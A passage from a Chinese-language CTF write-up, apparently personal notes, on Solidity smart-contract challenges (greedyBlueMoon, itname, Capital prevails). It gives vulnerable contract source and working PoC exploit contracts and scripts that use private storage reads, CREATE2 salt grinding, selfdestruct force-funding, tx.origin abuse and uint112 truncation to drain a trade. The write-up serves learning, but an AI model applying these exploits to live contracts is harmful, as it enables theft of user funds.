    uint8 private bonus; //3 1字节
    uint16 private price; //4 2字节
    uint8 private loot; //4 1字节
    bytes10 private password1; //4 10字节
    mapping(address => uint256) private attackingType; //5
    mapping(address => uint256) private waitTime; //6
    address chainaddr = address(this); //7
    uint256 private lol = 114; //8
    uint256 private L0L = 514; //9
    uint256 private Lo1 = 114514; //10
    bytes32[] private password2; //11
    uint16 public high2Prefix; //12
```

尤其注意slot4的那几个，key1就在其中

### password1

cast storage <地址> <槽位>，得到

```solidity
0x0000000000000000000000000000000000000072776562363636000000008f3a
```

`price`: 0x8f3a => 29303

`loot`: 0x00 => 0

`password1`： 72776562363636000000 => rweb666  作为第一个参数

### password2

```solidity
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01db9 0x8542365815820425000000000000000000000000000000000000000000000000 60274595836892880102263015710152418375603488291410874925448580322562196635648
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dba 0x9825367458436215000000000000000000000000000000000000000000000000 68817302157005032812774228469416427649423721787519004150499365819006161256448
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbb 0x9726841358563224000000000000000000000000000000000000000000000000 68367291876594506866871524762950999141942385624721284791047517844771134504960
//0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbc 0x6952148523852424000000000000000000000000000000000000000000000000 47637872184895342147211396033760031840832789996261776040046097242120792309760
```

每行三串，依次是

* chisel先bytes4读出一个hash **每个的hash值都是上一个的hash+1**
* 然后`cast storage`这串值
* 最后`cast to-dec`

最后拼接在一起，`0x8542365815820425982536745843621597268413585632246952148523852424`作为第二个参数

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "./Attack.sol";
import {greedyBlueMoon} from "./1.sol";

contract Factory {
    greedyBlueMoon moon =
        greedyBlueMoon(0x6253962a2310ae8AAd3eaFFC9de6BdA6C602Ff95);
    address public owner;
    uint256 public lastUsedSalt;

    function computeSalt(address target) public returns (bytes32) {
        for (uint256 i = lastUsedSalt + 1; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (
                (uint256(uint160(predictedAddress)) >> 144) >=
                moon.high2Prefix()
            ) {
                lastUsedSalt = i; //这个要格外注意一下,每次找到salt以后下一个就不要再重复了,从下一个开始找
                return salt;
            }
        }
        revert("No suitable salt found");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // 部署者地址
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash))); //预测的地址
    }

    function factory(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(paekkoAddress);
        return address(a);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {greedyBlueMoon} from "./1.sol";

contract Attack {
    greedyBlueMoon public moon;

    constructor(address addr) {
        moon = greedyBlueMoon(addr);
        moon.newchallengerBundle(); //领shard
        moon.transfersOfItems(0x98707a8Cb53bD823f9c5353611018aF38533adE5, 50); //把shard转给eoa
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "../src/Attack.sol";
import {greedyBlueMoon} from "../src/1.sol";
import {Script} from "forge-std/Script.sol";
import {Factory} from "../src/Factory.sol";

contract Attacjsc is Script {
    function run() external {
        vm.startBroadcast();
        bytes32 salt;

        Factory factory = new Factory();
        greedyBlueMoon moon = greedyBlueMoon(
            0x6253962a2310ae8AAd3eaFFC9de6BdA6C602Ff95
        );
        for (uint i = 1; i <= 1000; i++) {
            salt = factory.computeSalt(address(moon));//找salt
            factory.factory(salt, address(moon));//用预测出的符合条件的地址去领shard并且转给eoa
        }

        moon.redeemingParalyzingRing(
            0x72776562363636000000,
            0x8542365815820425982536745843621597268413585632246952148523852424
        );
        require(moon.isSolved() == true, "you are not greedybluemoon");
        vm.stopBroadcast();
    }
}

```

# itname

## 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

interface Wish_Maker {
    function wish_amount() external view returns (uint256);
}

//0x87c39e970f8B82c4e36888d83162a695FB113CCE
contract level {
    constructor() {
        owner = msg.sender;
    }

    string public name = "sanye";
    string public symbol = "CTF";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    bool public yourname;

    mapping(address => bool) public started;
    mapping(address => uint256) public wishes;
    mapping(address => bool) public wish_made;
    mapping(address => uint8) public callCounter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowances;

    modifier challenge_started() {
        require(started[tx.origin] == true, "no : started[tx.origin] == true");
        _;
    }

    modifier remains_wish() {
        require(wishes[tx.origin] > 0, "no : wishes[tx.origin] > 0");
        _;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "no : owner == msg.sender");
        _;
    }

    function deposit() external payable {
        uint256 amount = msg.value;
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function allowance(
        address _owner,
        address _spender
    ) external view returns (uint256) {
        return allowances[_owner][_spender];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "not enough balance");
        require(allowances[from][msg.sender] >= amount, "not enough allowance");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowances[from][msg.sender] -= amount;
        return true;
    }

    function start_challenge() public {
        require(started[tx.origin] == false);
        started[tx.origin] = true; //满足challenge_started
        wishes[tx.origin] = 1; //满足remains_wish
    }

    function end_challenge(address addr) public onlyOwner {
        started[addr] = false;
        wishes[addr] = 0;
        wish_made[addr] = false;
    }

    function withdraw(uint256 amount) external payable {
        require(balanceOf[msg.sender] > amount, "not enough token");
        balanceOf[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "no call");
    }

    function approve(address from, address to, uint256 amount) external {
        allowances[from][to] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "not enough balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function wish_making() external challenge_started remains_wish {
        Wish_Maker wish_maker = Wish_Maker(msg.sender);
        bool is_less_than = false;
        if (wish_maker.wish_amount() < 1) {
            is_less_than = true;
        }

        wish_made[tx.origin] = true; //以这个bool值为锚点做三元运算符

        if (is_less_than) {
            wishes[tx.origin] = wish_maker.wish_amount();
        } else {
            wishes[tx.origin]--;
        }
    }

    function regret() external challenge_started {
        wishes[tx.origin] = 1;
        wish_made[tx.origin] = false;
    }

    modifier level1() {
        require(tx.origin != msg.sender, "no : tx.origin != msg.sender"); //攻击合约,ok
        _;
    }

    modifier level2() {
        require(
            uint256(uint160(msg.sender)) % 77 == 7,
            "no : uint256(uint160(msg.sender)) % 77 == 7"
        ); //create预测指定Attack地址,ok
        _;
    }

    modifier level3() {
        require(address(this).balance > 0, "no : address(this).balance > 0"); //level自己有钱
        _;
    }

    modifier level4() {
        require(
            wishes[tx.origin] > 1 ? true : false == true,
            "no : wishes[tx.origin] > 1"
        ); //
        _;
    }

    receive() external payable {
        revert(); //正常收款不了,需要自毁强制打钱
    }

    function check() external level1 level2 level3 level4 {
        owner = tx.origin;
        yourname = true;
        require(yourname = true, "no: your name is not true");
    }

    function isSolved() external view returns (bool) {
        require(yourname == true, "no");
        return true;
    }
}

```

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import {Attack} from "./Attack.sol";

contract Deployer {
    function computeSalt(address target) public view returns (bytes32) {
        // 找salt
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint256(uint160(predictedAddress)) % 77 == 7) {
                return salt;
            }
        }
        revert("no suitable salt");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // 部署者地址
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash))); //预测的地址
    }

    function deployer(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(payable(paekkoAddress));
        return address(a);
    }
}

contract SelfDestructHelper {
    constructor() payable {}

    function boom(address payable addr) external payable {
        selfdestruct(addr);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {level, Wish_Maker} from "./1.sol";

contract Attack is Wish_Maker {
    level public sanye;
    uint256 public count = 1;

    constructor(address payable addr) payable {
        sanye = level(addr);
    }

    function wish_amount() external view override returns (uint256) {
        return !sanye.wish_made(tx.origin) ? 0 : 3;
    }

    function attack() external payable {
        sanye.deposit{value: 1 ether}();

        sanye.start_challenge();

        sanye.wish_making();

        sanye.check();
        // // // 第一步：deposit
        // (bool ok1, ) = address(sanye).call{value: 1 ether}(
        //     abi.encodeWithSignature("deposit()")
        // );
        // require(ok1, "deposit failed");

        // // 第二步：start_challenge
        // (bool ok2, ) = address(sanye).call(
        //     abi.encodeWithSignature("start_challenge()")
        // );
        // require(ok2, "start_challenge failed");

        // // 第三步：wish_making
        // (bool ok3, ) = address(sanye).call(
        //     abi.encodeWithSignature("wish_making()")
        // );
        // require(ok3, "wish_making failed");

        // // 第五步：check
        // (bool ok5, ) = address(sanye).call(abi.encodeWithSignature("check()"));
        // require(ok5, "check failed");
    }

    fallback() external {
        sanye.wish_making();
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "../src/Attack.sol";
import {Script, console} from "forge-std/Script.sol";
import {Deployer, SelfDestructHelper} from "../src/Deployer.sol";
import {level} from "../src/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Deployer deployer = new Deployer();
        SelfDestructHelper selfdestruct = new SelfDestructHelper();

        selfdestruct.boom{value: 1 ether}(
            payable(0xfce07041c73709123DE77b42655476857B66Fd8c) //先给level强制自毁打钱
        );
        level sanye = level(
            payable(0xfce07041c73709123DE77b42655476857B66Fd8c)
        );
        bytes32 salt = deployer.computeSalt(
            0xfce07041c73709123DE77b42655476857B66Fd8c
        );
        address attack = deployer.deployer(
            salt,
            0xfce07041c73709123DE77b42655476857B66Fd8c
        );
        Attack(attack).attack{value: 1 ether}();
        require(sanye.isSolved() == true, "you are not sanye");
        vm.stopBroadcast();
    }
}

```

# Capital prevails

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./ERC20.sol";
import "./Safe.sol";

contract Capital_prevails is Safe {
    struct Trade {
        address maker;
        address taker;
        address tokenToSell;
        address tokenToBuy;
        uint112 amountToSell;
        uint112 amountToBuy;
        uint112 filledAmountToSell;
        uint112 filledAmountToBuy;
        bool isActive;
    }

    mapping(uint256 => Trade) public trades;
    uint256 public nextTradeId;
    bool private locked;
    uint256 public fee = 30 wei;

    event TradeCreated(
        uint256 indexed tradeId,
        address indexed maker,
        address tokenToSell,
        address tokenToBuy,
        uint256 amountToSell,
        uint256 amountToBuy
    );
    event TradeSettled(
        uint256 indexed tradeId,
        address indexed settler,
        uint256 settledAmountToSell
    );
    event TradeCancelled(uint256 indexed tradeId);

    modifier nonReentrant() {
        //重入锁
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function createTrade(
        //挂订单
        address _tokenToSell, //rweb 卖
        address _tokenToBuy, //weth 买
        uint256 _amountToSell, //10 卖的数量
        uint256 _amountToBuy //1 买的数量
    ) external nonReentrant {
        require(
            _tokenToSell != address(0) && _tokenToBuy != address(0),
            "Invalid token addresses"
        );

        uint256 tradeId = nextTradeId++;
        trades[tradeId] = Trade({
            maker: msg.sender,
            taker: address(0),
            tokenToSell: _tokenToSell,
            tokenToBuy: _tokenToBuy,
            amountToSell: safeCast(_amountToSell - fee), //30wei 手续费，相当于锁了30wei不能拿出去交易,这里都能过
            amountToBuy: safeCast(_amountToBuy),
            filledAmountToSell: 0,
            filledAmountToBuy: 0,
            isActive: true
        });

        require(
            IERC20(_tokenToSell).transferFrom(
                msg.sender,
                address(this),
                _amountToSell //得到 10 rweb
            ),
            "Transfer failed"
        );

        emit TradeCreated(
            tradeId,
            msg.sender, //maker
            _tokenToSell,
            _tokenToBuy,
            _amountToSell,
            _amountToBuy
        );
    }

    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {
        //只有maker能调用 也就是setup 除非我们自己挂一单 ！！！
        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(scale > 0, "Invalid scale");
        require(trade.filledAmountToBuy == 0, "Trade is already filled");
        uint112 originalAmountToSell = trade.amountToSell;
        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale)); //这里会卡住，过不去safeMul()的require
        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale)); //主要是这里要砍成0
        uint256 newAmountNeededWithFee = safeCast(
            safeMul(originalAmountToSell, scale) + fee
        );
        if (originalAmountToSell < newAmountNeededWithFee) {
            require(
                IERC20(trade.tokenToSell).transferFrom(
                    msg.sender,
                    address(this),
                    newAmountNeededWithFee - originalAmountToSell
                ),
                "Transfer failed"
            );
        }
    }

    function settleTrade(
        //msg.sender可调用
        uint256 _tradeId,
        uint256 _amountToSettle
    ) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active"); //自己挂的那单已经设成了true
        require(_amountToSettle > 0, "Invalid settlement amount");
        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;

        require(
            trade.filledAmountToSell + _amountToSettle <= trade.amountToSell,
            "Exceeds available amount"
        );

        require(
            IERC20(trade.tokenToBuy).transferFrom(
                msg.sender,
                trade.maker,
                tradeAmount / trade.amountToSell
            ),
            "Buy transfer failed"
        );
        require(
            IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle),
            "Sell transfer failed"
        );

        trade.filledAmountToSell += safeCast(_amountToSettle);
        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);

        if (trade.filledAmountToSell > trade.amountToSell) {
            trade.isActive = false;
        }

        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);
    }

    function cancelTrade(uint256 _tradeId) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(msg.sender == trade.maker, "Only maker can cancel");
        require(trade.isActive, "Trade is not active");

        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;
        if (remainingAmount > 0) {
            require(
                IERC20(trade.tokenToSell).transfer(
                    trade.maker,
                    remainingAmount
                ),
                "Transfer failed"
            );
        }

        trade.isActive = false;

        emit TradeCancelled(_tradeId);
    }

    function getTrade(
        uint256 _tradeId
    )
        external
        view
        returns (
            address maker,
            address taker,
            address tokenToSell,
            address tokenToBuy,
            uint256 amountToSell,
            uint256 amountToBuy,
            uint256 filledAmountToSell,
            uint256 filledAmountToBuy,
            bool isActive
        )
    {
        Trade storage trade = trades[_tradeId];
        return (
            trade.maker,
            trade.taker,
            trade.tokenToSell,
            trade.tokenToBuy,
            trade.amountToSell,
            trade.amountToBuy,
            trade.filledAmountToSell,
            trade.filledAmountToBuy,
            trade.isActive
        );
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Safe {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "Safe: value exceeds uint112 max");
        return uint112(value);
    }

    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {
        require(
            uint256(a) * b <= (1 << 112), // a=!!47!!这里过不了 b=*1<<112
            "Safe: value exceeds uint112 max"
        );
        return uint112(a * b);
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

contract SimpleERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }

    function transfer(address _to, uint256 _value) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) external returns (bool) {
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(
            allowance[_from][msg.sender] >= _value,
            "Insufficient allowance"
        );

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);
        return true;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
import "./Capital_prevails.sol";

//0x26bB262c72B9cF11B5F84c6a89d2D5A8BBDd3aBE

contract Setup {
    Capital_prevails public capital_prevails;
    SimpleERC20 public rweb;
    SimpleERC20 public weth;
    address public constant proletariat = address(0xc0ffee);

    constructor() {
        capital_prevails = new Capital_prevails();
        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);
        rweb = new SimpleERC20("RWeb Token", "RWEBT", 18, 10 ether);
        rweb.approve(address(capital_prevails), 10 ether);
        capital_prevails.createTrade(
            address(rweb),
            address(weth),
            10 ether,
            1 ether
        );
    }

    function isSolved() public view returns (bool) {
        return rweb.balanceOf(proletariat) >= 10 ether;
    }
}

```

## uint112截断

`uint112`的取值范围是 <font style="background-color:#FBDFEF;">0 到</font><code><font style="background-color:#FBDFEF;">2^112 - 1</font></code>,`(1 << 112)` 等于 `2^112`

* 在 Solidity 中把一个 `uint256` 强制转换 `uint112(value)`，会做 **模 ****2****&#x31;12\*\*\*\*2^{112}****2****&#x31;12** 的截断（低 112 位保留，高位丢弃）。
* 例如 `uint112(2^112) == 0`，因为 `2^112 mod 2^112 = 0`。
* `uint112(2^112 - 1)` 是 `2^112 - 1`

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import "./ERC20.sol";
import "./Safe.sol";
import {Capital_prevails} from "./Capital_prevails.sol";
import {Setup} from "./Setup.sol";

contract Attack {
    Capital_prevails public prevails;
    SimpleERC20 public rweb;
    SimpleERC20 public weth;
    Setup setup;

    constructor(address addr) {
        setup = Setup(addr);
        rweb = setup.rweb();
        weth = setup.weth();
        prevails = Capital_prevails(setup.capital_prevails());
    }

    function attack() external payable {
        rweb.approve(address(prevails), type(uint256).max); //给prevail授权
        rweb.approve(
            0x98707a8Cb53bD823f9c5353611018aF38533adE5,
            type(uint256).max //给eoa授权
        );
        for (int i = 0; i <= 4; i++) {
            //从setup挂的那单白嫖
            prevails.settleTrade(0, 9); //利用向下取整，我们每次付出0，可以得到每轮9wei的rweb
        } //最多白嫖大概2.62e,要跑29000轮
        //这里跑四轮,只要把接下来自己挂单的那个费用白嫖够了就行

        prevails.createTrade(address(rweb), address(weth), 31, 0); //自己挂一单，成为maker,31是考虑到有30wei的手续费,正好剩下1,可以在safe嵌套require那里少算一步(其实是因为我算不明白两步)
        uint256 a = 1 << 112; //这个就是2的112次方
        prevails.scaleTrade(1, a - 30); //第二个参数是关键,要把我们自己挂的那单,利用safe那个require>=的点,把amountToBuy设为0,也就是买家需要给出的代币数量
        prevails.settleTrade(1, rweb.balanceOf(address(prevails))); //从自己挂的那单那里买,由于上一步已经amountToBuy==0,所以这里买就直接花费0个代币,直接把挂单里的都拿来就行了
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;
import "../src/ERC20.sol";
import "../src/Safe.sol";
import {Capital_prevails} from "../src/Capital_prevails.sol";
import {Setup} from "../src/Setup.sol";
import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        address set = 0x99aEFdDABeA7795069C034121a8EB79311297e06;
        Setup setup = Setup(set);
        SimpleERC20 rweb = setup.rweb();
        Attack attack = new Attack(set);
        attack.attack();
        uint256 money = rweb.balanceOf(address(attack));
        rweb.transferFrom(address(attack), address(0xc0ffee), money);//把攻击合约拿到的rweb都转给0xc0ffee
        require(setup.isSolved() == true, "your issolved is not solved");

        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-13 00:08:11  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/fp0x4fv8ibblcw2a>